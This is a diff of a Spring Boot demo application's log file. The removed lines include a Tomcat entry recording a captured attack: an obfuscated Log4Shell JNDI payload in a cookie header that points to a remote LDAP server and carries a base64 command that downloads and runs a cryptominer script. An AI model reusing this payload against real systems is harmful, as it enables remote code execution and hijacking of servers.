@@ -1,57 +1,19 @@
-2023-12-03 00:33:06.422  INFO 34632 --- [http-nio-8088-exec-1] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
- Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
-
-java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000xee0x010x000x000xea0x030x031d0xfa0x010x1c0x8c0x910xf30x910x1eR0x8bZ0xb8\0x080x070x88Pl0xc5t0xde0xee(0x08<W0xd9k0xaf0xd8 ]. HTTP method names must be tokens
-	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:419) ~[tomcat-embed-core-9.0.56.jar:9.0.56]
-	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:269) ~[tomcat-embed-core-9.0.56.jar:9.0.56]
-	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) ~[tomcat-embed-core-9.0.56.jar:9.0.56]
-	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:895) ~[tomcat-embed-core-9.0.56.jar:9.0.56]
-	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1732) ~[tomcat-embed-core-9.0.56.jar:9.0.56]
-	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) ~[tomcat-embed-core-9.0.56.jar:9.0.56]
-	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) ~[tomcat-embed-core-9.0.56.jar:9.0.56]
-	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) ~[tomcat-embed-core-9.0.56.jar:9.0.56]
-	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) ~[tomcat-embed-core-9.0.56.jar:9.0.56]
-	at java.base/java.lang.Thread.run(Thread.java:1589) ~[na:na]
-
-2023-12-03 01:24:58.117  INFO 34632 --- [http-nio-8088-exec-3] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring DispatcherServlet 'dispatcherServlet'
-2023-12-03 01:24:58.122  INFO 34632 --- [http-nio-8088-exec-3] o.s.web.servlet.DispatcherServlet        : Initializing Servlet 'dispatcherServlet'
-2023-12-03 01:24:58.273  INFO 34632 --- [http-nio-8088-exec-3] o.s.web.servlet.DispatcherServlet        : Completed initialization in 150 ms
-2023-12-03 01:25:10.399  WARN 34632 --- [http-nio-8088-exec-5] o.a.c.util.SessionIdGeneratorBase        : Creation of SecureRandom instance for session ID generation using [SHA1PRNG] took [150] milliseconds.
-2023-12-03 01:25:17.988  INFO 34632 --- [http-nio-8088-exec-7] r.k.s.b.d.controllers.AdminController    : Admin page requested 
-2023-12-03 01:25:46.140  INFO 34632 --- [http-nio-8088-exec-2] r.k.s.b.d.controllers.AdminController    : Admin page requested 
-2023-12-03 01:42:45.261  INFO 34632 --- [http-nio-8088-exec-2] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
- Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
-
-java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x020x000x010x000x010xfc0x030x030x0bV)0x120x9f*0xa60xd30xcd0x190xb60xb50xacl0x87*0xec0x83#L0xd90xee(0xa5~0xa10x070xdd0xae0Y0xdb ]. HTTP method names must be tokens
-	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:419) ~[tomcat-embed-core-9.0.56.jar:9.0.56]
-	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:269) ~[tomcat-embed-core-9.0.56.jar:9.0.56]
-	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) ~[tomcat-embed-core-9.0.56.jar:9.0.56]
-	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:895) ~[tomcat-embed-core-9.0.56.jar:9.0.56]
-	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1732) ~[tomcat-embed-core-9.0.56.jar:9.0.56]
-	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) ~[tomcat-embed-core-9.0.56.jar:9.0.56]
-	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) ~[tomcat-embed-core-9.0.56.jar:9.0.56]
-	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) ~[tomcat-embed-core-9.0.56.jar:9.0.56]
-	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) ~[tomcat-embed-core-9.0.56.jar:9.0.56]
-	at java.base/java.lang.Thread.run(Thread.java:1589) ~[na:na]
-
-2023-12-03 03:24:12.945  INFO 34632 --- [http-nio-8088-exec-7] o.apache.tomcat.util.http.parser.Cookie  : A cookie header was received [('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//174.138.82.190:1389/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQzNQb29sL3htcmlnX3NldHVwL21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBiYXNoIC1zIDQ4Nnhxdzd5c1hkS3c3UmtWelQ1dGRTaUR0RTZzb3hVZFlhR2FHRTFHb2FDZHZCRjdyVmc1b01YTDlwRngzckIxV1VDWnJKdmQ2QUhNRldpcGVZdDVlRk5VeDlwbUdO}')] that contained an invalid cookie. That cookie will be ignored.
- Note: further occurrences of this error will be logged at DEBUG level.
-2023-12-03 07:46:31.006  INFO 53200 --- [main] d.SpringBootSecurityDemoApplicationTests : Starting SpringBootSecurityDemoApplicationTests using Java 19.0.2 on lan with PID 53200 (started by svn13 in C:\Program Files\JetBrains\IntelliJ IDEA 2022.3.2\jbr\bin\3_1_3)
-2023-12-03 07:46:31.008  INFO 53200 --- [main] d.SpringBootSecurityDemoApplicationTests : The following profiles are active: test
-2023-12-03 07:46:32.475  INFO 53200 --- [main] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data JPA repositories in DEFAULT mode.
-2023-12-03 07:46:32.562  INFO 53200 --- [main] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 72 ms. Found 2 JPA repository interfaces.
-2023-12-03 07:46:33.696  INFO 53200 --- [main] o.hibernate.jpa.internal.util.LogHelper  : HHH000204: Processing PersistenceUnitInfo [name: default]
-2023-12-03 07:46:33.914  INFO 53200 --- [main] org.hibernate.Version                    : HHH000412: Hibernate ORM core version 5.6.3.Final
-2023-12-03 07:46:34.209  INFO 53200 --- [main] o.hibernate.annotations.common.Version   : HCANN000001: Hibernate Commons Annotations {5.1.2.Final}
-2023-12-03 07:46:34.447  INFO 53200 --- [main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Starting...
-2023-12-03 07:46:34.904  INFO 53200 --- [main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Start completed.
-2023-12-03 07:46:34.956  INFO 53200 --- [main] org.hibernate.dialect.Dialect            : HHH000400: Using dialect: org.hibernate.dialect.MySQL8Dialect
-2023-12-03 07:46:36.463  INFO 53200 --- [main] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
-2023-12-03 07:46:36.480  INFO 53200 --- [main] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
-2023-12-03 07:46:37.526  WARN 53200 --- [main] JpaBaseConfiguration$JpaWebConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
-2023-12-03 07:46:37.988  INFO 53200 --- [main] o.s.s.web.DefaultSecurityFilterChain     : Will secure any request with [org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@4bc4ec43, org.springframework.security.web.context.SecurityContextPersistenceFilter@164db8f0, org.springframework.security.web.header.HeaderWriterFilter@3a83cfbc, org.springframework.security.web.csrf.CsrfFilter@693ed09d, org.springframework.security.web.authentication.logout.LogoutFilter@6277a496, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@18cb4ed1, org.springframework.security.web.authentication.ui.DefaultLoginPageGeneratingFilter@29693b1d, org.springframework.security.web.authentication.ui.DefaultLogoutPageGeneratingFilter@6560f387, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@1f6d3a81, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@3dbf3bc, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@6a24c41d, org.springframework.security.web.session.SessionManagementFilter@6b30ff23, org.springframework.security.web.access.ExceptionTranslationFilter@28befd62, org.springframework.security.web.access.intercept.FilterSecurityInterceptor@7b9d602c]
-2023-12-03 07:46:38.689  INFO 53200 --- [main] o.s.b.a.w.s.WelcomePageHandlerMapping    : Adding welcome page template: index
-2023-12-03 07:46:39.218  INFO 53200 --- [main] d.SpringBootSecurityDemoApplicationTests : Started SpringBootSecurityDemoApplicationTests in 8.818 seconds (JVM running for 10.823)
-2023-12-03 07:46:39.587  INFO 53200 --- [SpringApplicationShutdownHook] j.LocalContainerEntityManagerFactoryBean : Closing JPA EntityManagerFactory for persistence unit 'default'
-2023-12-03 07:46:39.590  INFO 53200 --- [SpringApplicationShutdownHook] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Shutdown initiated...
-2023-12-03 07:46:39.600  INFO 53200 --- [SpringApplicationShutdownHook] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Shutdown completed.
+2023-12-04 02:51:35.922  INFO 33568 --- [main] d.SpringBootSecurityDemoApplicationTests : Starting SpringBootSecurityDemoApplicationTests using Java 19.0.2 on lan with PID 33568 (started by svn13 in C:\Program Files\JetBrains\IntelliJ IDEA 2022.3.2\jbr\bin\3_1_3)
+2023-12-04 02:51:35.926  INFO 33568 --- [main] d.SpringBootSecurityDemoApplicationTests : The following profiles are active: test
+2023-12-04 02:51:37.355  INFO 33568 --- [main] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+2023-12-04 02:51:37.475  INFO 33568 --- [main] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 101 ms. Found 2 JPA repository interfaces.
+2023-12-04 02:51:38.484  INFO 33568 --- [main] o.hibernate.jpa.internal.util.LogHelper  : HHH000204: Processing PersistenceUnitInfo [name: default]
+2023-12-04 02:51:38.595  INFO 33568 --- [main] org.hibernate.Version                    : HHH000412: Hibernate ORM core version 5.6.3.Final
+2023-12-04 02:51:38.639  INFO 33568 --- [main] o.hibernate.annotations.common.Version   : HCANN000001: Hibernate Commons Annotations {5.1.2.Final}
+2023-12-04 02:51:38.839  INFO 33568 --- [main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Starting...
+2023-12-04 02:51:40.013  INFO 33568 --- [main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Start completed.
+2023-12-04 02:51:40.072  INFO 33568 --- [main] org.hibernate.dialect.Dialect            : HHH000400: Using dialect: org.hibernate.dialect.MySQL8Dialect
+2023-12-04 02:51:41.025  INFO 33568 --- [main] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
+2023-12-04 02:51:41.039  INFO 33568 --- [main] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
+2023-12-04 02:51:41.776  WARN 33568 --- [main] JpaBaseConfiguration$JpaWebConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+2023-12-04 02:51:42.188  INFO 33568 --- [main] o.s.s.web.DefaultSecurityFilterChain     : Will secure any request with [org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@914ab92, org.springframework.security.web.context.SecurityContextPersistenceFilter@7d65c0ac, org.springframework.security.web.header.HeaderWriterFilter@2fbd47b7, org.springframework.security.web.csrf.CsrfFilter@6905d030, org.springframework.security.web.authentication.logout.LogoutFilter@147c4523, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@1952ad9d, org.springframework.security.web.authentication.ui.DefaultLoginPageGeneratingFilter@d43f205, org.springframework.security.web.authentication.ui.DefaultLogoutPageGeneratingFilter@79d3c655, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@568fd3de, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@53654b2d, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@42ea14b8, org.springframework.security.web.session.SessionManagementFilter@5edaa572, org.springframework.security.web.access.ExceptionTranslationFilter@3146f3d7, org.springframework.security.web.access.intercept.FilterSecurityInterceptor@44723d95]
+2023-12-04 02:51:42.785  INFO 33568 --- [main] o.s.b.a.w.s.WelcomePageHandlerMapping    : Adding welcome page template: index
+2023-12-04 02:51:43.338  INFO 33568 --- [main] d.SpringBootSecurityDemoApplicationTests : Started SpringBootSecurityDemoApplicationTests in 7.751 seconds (JVM running for 12.886)
+2023-12-04 02:51:43.399  INFO 33568 --- [SpringApplicationShutdownHook] j.LocalContainerEntityManagerFactoryBean : Closing JPA EntityManagerFactory for persistence unit 'default'
+2023-12-04 02:51:43.401  INFO 33568 --- [SpringApplicationShutdownHook] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Shutdown initiated...
+2023-12-04 02:51:43.406  INFO 33568 --- [SpringApplicationShutdownHook] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Shutdown completed.
